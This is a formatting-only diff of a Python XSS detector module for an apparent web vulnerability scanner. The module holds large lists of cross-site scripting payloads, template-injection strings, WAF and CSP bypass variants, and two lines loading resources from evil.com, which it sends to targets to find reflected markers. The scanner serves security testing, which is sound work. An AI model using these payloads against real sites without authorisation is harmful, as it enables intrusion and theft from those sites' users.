@@ -16,7 +16,6 @@ Every engine:
   - Guards against JSON / plain-text echo non-HTML contexts.
 """
 
-
 from __future__ import annotations
 
 import copy
@@ -53,54 +52,54 @@ _HTML_TAG_PAYLOADS: tuple[str, ...] = (
     "<select autofocus onfocus=alert(1)>",
     "<textarea autofocus onfocus=alert(1)>",
     "<keygen autofocus onfocus=alert(1)>",
-    "<<script>alert(1)//<</script>",                  # double-bracket parser confusion
-    "<scr\x00ipt>alert(1)</scr\x00ipt>",              # null-byte WAF bypass
-    "<scr\nipt>alert(1)</scr\nipt>",                  # newline bypass
-    "<IMG SRC=x OnErRoR=alert(1)>",                   # case mutation
-    "<img src=\"x\" onerror=\"alert(1)\">",
-    "<iframe srcdoc=\"<script>alert(1)</script>\">",
-    "<math><mtext></table></math><img src=x onerror=alert(1)>",   # HTML5 parser confusion
+    "<<script>alert(1)//<</script>",  # double-bracket parser confusion
+    "<scr\x00ipt>alert(1)</scr\x00ipt>",  # null-byte WAF bypass
+    "<scr\nipt>alert(1)</scr\nipt>",  # newline bypass
+    "<IMG SRC=x OnErRoR=alert(1)>",  # case mutation
+    '<img src="x" onerror="alert(1)">',
+    '<iframe srcdoc="<script>alert(1)</script>">',
+    "<math><mtext></table></math><img src=x onerror=alert(1)>",  # HTML5 parser confusion
 )
 
 # Context 2: Attribute breakout (inject into value="..." to escape into event handler)
 _ATTR_BREAKOUT_PAYLOADS: tuple[str, ...] = (
-    "\" onmouseover=\"alert(1)",
-    "\" onfocus=\"alert(1)\" autofocus=\"",
-    "\" onerror=\"alert(1)\" src=\"x",
+    '" onmouseover="alert(1)',
+    '" onfocus="alert(1)" autofocus="',
+    '" onerror="alert(1)" src="x',
     "' onmouseover='alert(1)",
     "' onfocus='alert(1)' autofocus='",
     '" autofocus onfocus=alert(1) x="',
-    "\" style=\"animation-name:x\" onanimationstart=\"alert(1)",
-    "\"><script>alert(1)</script>",
+    '" style="animation-name:x" onanimationstart="alert(1)',
+    '"><script>alert(1)</script>',
     "'\"><svg onload=alert(1)>",
-    "\" tabindex=1 onfocus=alert(1) autofocus x=\"",
+    '" tabindex=1 onfocus=alert(1) autofocus x="',
 )
 
 # Context 3: JavaScript string breakout (inject into var x = "..." or var x = '...')
 _JS_STRING_PAYLOADS: tuple[str, ...] = (
     "'-alert(1)-'",
-    "\"-alert(1)-\"",
+    '"-alert(1)-"',
     "';alert(1)//",
-    "\";alert(1)//",
+    '";alert(1)//',
     "\\';alert(1)//",
     "\\x27;alert(1)//",
     "</script><script>alert(1)</script>",
-    "${alert(1)}",                           # template literal
-    "`${alert(1)}`",                         # template literal alt
-    "\\u0022;alert(1)//",                    # unicode escape
+    "${alert(1)}",  # template literal
+    "`${alert(1)}`",  # template literal alt
+    "\\u0022;alert(1)//",  # unicode escape
 )
 
 # Context 4: Client-Side Template Injection (AngularJS, Vue, React, Freemarker)
 _CSTI_PAYLOADS: tuple[str, ...] = (
-    "{{7*7}}",                                                        # math oracle
-    "{{constructor.constructor('alert(1)')()}}",                     # AngularJS sandbox escape
+    "{{7*7}}",  # math oracle
+    "{{constructor.constructor('alert(1)')()}}",  # AngularJS sandbox escape
     "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",  # Twig
-    "${7*7}",                                                         # Spring EL / Freemarker
-    "#{7*7}",                                                         # Thymeleaf
-    "*{7*7}",                                                         # Thymeleaf selection
-    "{7*7}",                                                          # generic
-    "{{alert(1)}}",                                                   # Vue-style
-    "%7B%7Balert(1)%7D%7D",                                          # URL-encoded
+    "${7*7}",  # Spring EL / Freemarker
+    "#{7*7}",  # Thymeleaf
+    "*{7*7}",  # Thymeleaf selection
+    "{7*7}",  # generic
+    "{{alert(1)}}",  # Vue-style
+    "%7B%7Balert(1)%7D%7D",  # URL-encoded
 )
 
 # Context 5: Header-reflected XSS (Referer, User-Agent stored/reflected)
@@ -108,7 +107,7 @@ _HEADER_XSS_PAYLOADS: tuple[str, ...] = (
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
-    "\" onmouseover=\"alert(1)",
+    '" onmouseover="alert(1)',
     "'-alert(1)-'",
 )
 
@@ -126,15 +125,15 @@ _WAF_BYPASS_VARIANTS: tuple[str, ...] = (
     "<ScRiPt>alert(1)</ScRiPt>",
     "<script/x>alert(1)</script>",
     "<img/src=x onerror=alert(1)>",
-    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",   # HTML entity encoded
-    "\u003cscript\u003ealert(1)\u003c/script\u003e",    # unicode escape
-    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",              # URL encoded
-    "<script>/*</script><script>*/alert(1)</script>",    # comment split
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entity encoded
+    "\u003cscript\u003ealert(1)\u003c/script\u003e",  # unicode escape
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL encoded
+    "<script>/*</script><script>*/alert(1)</script>",  # comment split
     "<svg><script>alert(1)</script></svg>",
     "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
     "<div/onmouseover='alert(1)'>text</div>",
     "<a/href=javascript:alert(1)>click",
-    "javascript:alert(1)",                              # href / action / src sinks
+    "javascript:alert(1)",  # href / action / src sinks
     "data:text/html,<script>alert(1)</script>",
 )
 
@@ -147,22 +146,22 @@ _DOM_SINK_PAYLOADS: tuple[str, ...] = (
     "javascript:alert(1)%00",
     "javascript:alert(1)%0a",
     # localStorage/sessionStorage sinks (sinks that eval/storage-followed values)
-    "x\" onerror=\"alert(1)",
+    'x" onerror="alert(1)',
     "x' onerror='alert(1)",
-    "x\" onclick=\"alert(1)",
+    'x" onclick="alert(1)',
     "x' onclick='alert(1)",
     # eval / setTimeout / setInterval sinks
     "';alert(1)//",
-    "\";alert(1)//",
+    '";alert(1)//',
     "');alert(1)//",
-    "\");alert(1)//",
+    '");alert(1)//',
     # WebSocket / postMessage sink payloads
     "<img src=x onerror=alert(1)>",
     "eval(alert(1))",
     "setTimeout(alert(1),0)",
     "setInterval(alert(1),0)",
     # CSS expression / behavior sinks (IE legacy)
-    "x\" expression\\alert(1)//",
+    'x" expression\\alert(1)//',
     "x\" -moz-binding:url('http://evil.com/xss.xml#xss')//",
     # SVG-based sinks
     "<svg/onload=alert(1)>",
@@ -185,37 +184,37 @@ _CSP_BYPASS_PAYLOADS: tuple[str, ...] = (
     # DOM-based CSP bypass via base-uri
     "<base href='javascript://alert(1)//'>",
     # Style-src bypass via expression (IE)
-    "<div style=\"width: expression(alert(1));\">",
+    '<div style="width: expression(alert(1));">',
     # Font-face @import bypass (style-src 'self' + 'unsafe-inline' but strict-dynamic)
     "@import url('https://evil.com/evil.css');",
     # Object/data URI bypass
-    "<object data=\"data:text/html,<script>alert(1)</script>\">",
-    "<embed src=\"data:text/html,<script>alert(1)</script>\">",
+    '<object data="data:text/html,<script>alert(1)</script>">',
+    '<embed src="data:text/html,<script>alert(1)</script>">',
     # iframe srcdoc bypass
-    "<iframe srcdoc=\"<script>alert(1)</script>\">",
+    '<iframe srcdoc="<script>alert(1)</script>">',
     # Form action + enctype bypass (multipart/form-data can bypass some WAFs)
-    "<form action=\"javascript:alert(1)\" enctype=\"text/plain\"><input type=\"submit\"></form>",
+    '<form action="javascript:alert(1)" enctype="text/plain"><input type="submit"></form>',
     # Blob URL + iframe bypass
-    "<iframe src=\"javascript:alert(1)\">",
+    '<iframe src="javascript:alert(1)">',
     # Meta refresh + javascript: URL
-    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
 )
 
 # Context 9: Modern JS framework sink payloads (React, Vue, Angular, Svelte)
 _FRAMEWORK_SINK_PAYLOADS: tuple[str, ...] = (
     # React: dangerouslySetInnerHTML, srcDoc, href with javascript:
-    "<a href=\"javascript:alert(1)\">click</a>",
-    "<iframe srcDoc=\"<script>alert(1)</script>\">",
+    '<a href="javascript:alert(1)">click</a>',
+    '<iframe srcDoc="<script>alert(1)</script>">',
     "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
     # Vue: v-html, href with javascript:
-    "<div v-html=\"<img src=x onerror=alert(1)>\" />",
-    "<a href=\"javascript:alert(1)\" @click.prevent>",
+    '<div v-html="<img src=x onerror=alert(1)>" />',
+    '<a href="javascript:alert(1)" @click.prevent>',
     # Angular: [innerHTML], bypass TrustedHtml if context allows
     "<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\" />",
     # Svelte: {@html}, href with javascript:
     "{@html '<img src=x onerror=alert(1)>'}",
     # Lit / fast-element: unsafeHTML
-    "<div .innerHTML=\"<img src=x onerror=alert(1)>\" />",
+    '<div .innerHTML="<img src=x onerror=alert(1)>" />',
 )
 
 
@@ -249,29 +248,26 @@ class XSSDetector:
 
         # Build global payload pool from PayloadForge + all context sets
         base_payloads = self.payload_smith.get_base_payloads("xss", context_data)
-        waf = (
-            self.payload_smith.detect_waf({}, "", 0)
-            or self.fingerprint.get("waf", "unknown")
-        )
+        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
         if waf and waf != "unknown":
-            base_payloads.extend(
-                self.payload_smith.get_waf_bypass_payloads(base_payloads[:5], waf)
-            )
+            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:5], waf))
         mutated = await self.payload_smith.mutate(base_payloads, context_data)
         forge_payloads = list(dict.fromkeys(base_payloads + mutated))
 
         # Assemble complete cross-context suite
-        all_payloads = list(dict.fromkeys(
-            forge_payloads
-            + list(_HTML_TAG_PAYLOADS)
-            + list(_ATTR_BREAKOUT_PAYLOADS)
-            + list(_JS_STRING_PAYLOADS)
-            + list(_CSTI_PAYLOADS)
-            + list(_WAF_BYPASS_VARIANTS)
-            + list(_DOM_SINK_PAYLOADS)
-            + list(_CSP_BYPASS_PAYLOADS)
-            + list(_FRAMEWORK_SINK_PAYLOADS)
-        ))
+        all_payloads = list(
+            dict.fromkeys(
+                forge_payloads
+                + list(_HTML_TAG_PAYLOADS)
+                + list(_ATTR_BREAKOUT_PAYLOADS)
+                + list(_JS_STRING_PAYLOADS)
+                + list(_CSTI_PAYLOADS)
+                + list(_WAF_BYPASS_VARIANTS)
+                + list(_DOM_SINK_PAYLOADS)
+                + list(_CSP_BYPASS_PAYLOADS)
+                + list(_FRAMEWORK_SINK_PAYLOADS)
+            )
+        )
 
         # ── Engine 1-4: All query/body params, all contexts ───────────
         for param_name in list(params.keys()):
@@ -295,9 +291,7 @@ class XSSDetector:
     # CONTEXT-AWARE PAYLOAD SUITE BUILDER
     # ------------------------------------------------------------------
 
-    def _build_context_suite(
-        self, param_name: str, param_val: str, generic_payloads: list[str]
-    ) -> list[str]:
+    def _build_context_suite(self, param_name: str, param_val: str, generic_payloads: list[str]) -> list[str]:
         """
         Prepend the most likely context-specific payloads based on what
         we know about the parameter, then append the full generic pool.
@@ -373,41 +367,44 @@ class XSSDetector:
                     raw_marker = f"<!--{marker}-->"
                     ct = (resp.headers.get("content-type", "") or "").lower()
                     non_html_types = {
-                        "application/json", "application/xml", "text/xml",
-                        "text/plain", "text/json", "application/ld+json",
+                        "application/json",
+                        "application/xml",
+                        "text/xml",
+                        "text/plain",
+                        "text/json",
+                        "application/ld+json",
                     }
                     is_non_html = any(nt in ct for nt in non_html_types)
-                    is_html = (
-                        not is_non_html
-                        and ("text/html" in ct
-                             or "<html" in body.lower()
-                             or "<!doctype" in body.lower())
+                    is_html = not is_non_html and (
+                        "text/html" in ct or "<html" in body.lower() or "<!doctype" in body.lower()
                     )
 
                     if raw_marker in body and raw_marker not in baseline_body and is_html:
                         diffs = BaselineAnalyzer.diff_responses(baseline_body, body, marker)
                         diffs.append(f"xss:header_marker_reflected:{marker}")
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method=method.upper(),
-                            param=header_name,
-                            location="header",
-                            payload=payload,
-                            attack_type=AttackType.XSS,
-                            severity=Severity.HIGH,
-                            verified=True,
-                            confidence=0.88,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "http_header"},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method=method.upper(),
+                                param=header_name,
+                                location="header",
+                                payload=payload,
+                                attack_type=AttackType.XSS,
+                                severity=Severity.HIGH,
+                                verified=True,
+                                confidence=0.88,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "http_header"},
+                            )
+                        )
                         break
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -477,41 +474,44 @@ class XSSDetector:
                     raw_marker = f"<!--{marker}-->"
                     ct = (resp.headers.get("content-type", "") or "").lower()
                     non_html_types = {
-                        "application/json", "application/xml", "text/xml",
-                        "text/plain", "text/json", "application/ld+json",
+                        "application/json",
+                        "application/xml",
+                        "text/xml",
+                        "text/plain",
+                        "text/json",
+                        "application/ld+json",
                     }
                     is_non_html = any(nt in ct for nt in non_html_types)
-                    is_html = (
-                        not is_non_html
-                        and ("text/html" in ct
-                             or "<html" in body.lower()
-                             or "<!doctype" in body.lower())
+                    is_html = not is_non_html and (
+                        "text/html" in ct or "<html" in body.lower() or "<!doctype" in body.lower()
                     )
 
                     if raw_marker in body and raw_marker not in baseline_body and is_html:
                         diffs = BaselineAnalyzer.diff_responses(baseline_body, body, marker)
                         diffs.append(f"xss:json_marker_reflected:{marker}")
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method="POST",
-                            param=".".join(str(p) for p in path),
-                            location="json_body",
-                            payload=payload,
-                            attack_type=AttackType.XSS,
-                            severity=Severity.HIGH,
-                            verified=True,
-                            confidence=0.85,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "json_ast", "json_path": path},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method="POST",
+                                param=".".join(str(p) for p in path),
+                                location="json_body",
+                                payload=payload,
+                                attack_type=AttackType.XSS,
+                                severity=Severity.HIGH,
+                                verified=True,
+                                confidence=0.85,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "json_ast", "json_path": path},
+                            )
+                        )
                         break
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -556,9 +556,13 @@ class XSSDetector:
 
         try:
             if method == "GET":
-                baseline_resp = await context.request.get(url, params=all_params, headers={"Referer": target}, timeout=3000)
+                baseline_resp = await context.request.get(
+                    url, params=all_params, headers={"Referer": target}, timeout=3000
+                )
             else:
-                baseline_resp = await context.request.post(url, data=all_params, headers={"Referer": target}, timeout=3000)
+                baseline_resp = await context.request.post(
+                    url, data=all_params, headers={"Referer": target}, timeout=3000
+                )
             baseline_body = await baseline_resp.text()
             baseline_status = baseline_resp.status
         except Exception as exc:
@@ -597,21 +601,23 @@ class XSSDetector:
                 # A marker inside value="..." renders as plain text, not JS.
                 body_outside_attrs = re.sub(
                     r'=(["\'])[^"\']*?' + re.escape(raw_marker) + r'[^"\']*\1',
-                    "", body,
+                    "",
+                    body,
                 )
 
                 # ── Oracle 3: Must be an HTML response ────────────────────
                 ct = (resp.headers.get("content-type", "") or "").lower()
                 non_html_types = {
-                    "application/json", "application/xml", "text/xml",
-                    "text/plain", "text/json", "application/ld+json",
+                    "application/json",
+                    "application/xml",
+                    "text/xml",
+                    "text/plain",
+                    "text/json",
+                    "application/ld+json",
                 }
                 is_non_html = any(nt in ct for nt in non_html_types)
-                is_html = (
-                    not is_non_html
-                    and ("text/html" in ct
-                         or "<html" in body.lower()
-                         or "<!doctype" in body.lower())
+                is_html = not is_non_html and (
+                    "text/html" in ct or "<html" in body.lower() or "<!doctype" in body.lower()
                 )
 
                 # ── Oracle 4: Backend error guard ─────────────────────────
@@ -640,10 +646,19 @@ class XSSDetector:
                     diffs.append(f"xss:marker_reflected:{marker}")
 
                     # Severity escalation: script/onerror execution context = CRITICAL
-                    is_exec_context = any(t in payload.lower() for t in [
-                        "<script", "onerror=", "onload=", "onfocus=", "onmouseover=",
-                        "javascript:", "ontoggle=", "onanimation",
-                    ])
+                    is_exec_context = any(
+                        t in payload.lower()
+                        for t in [
+                            "<script",
+                            "onerror=",
+                            "onload=",
+                            "onfocus=",
+                            "onmouseover=",
+                            "javascript:",
+                            "ontoggle=",
+                            "onanimation",
+                        ]
+                    )
                     severity = Severity.CRITICAL if is_exec_context else Severity.HIGH
 
                     confidence, verified, _ = score_signals(signals)
@@ -677,6 +692,3 @@ class XSSDetector:
                 continue
 
         return None
-
-
-
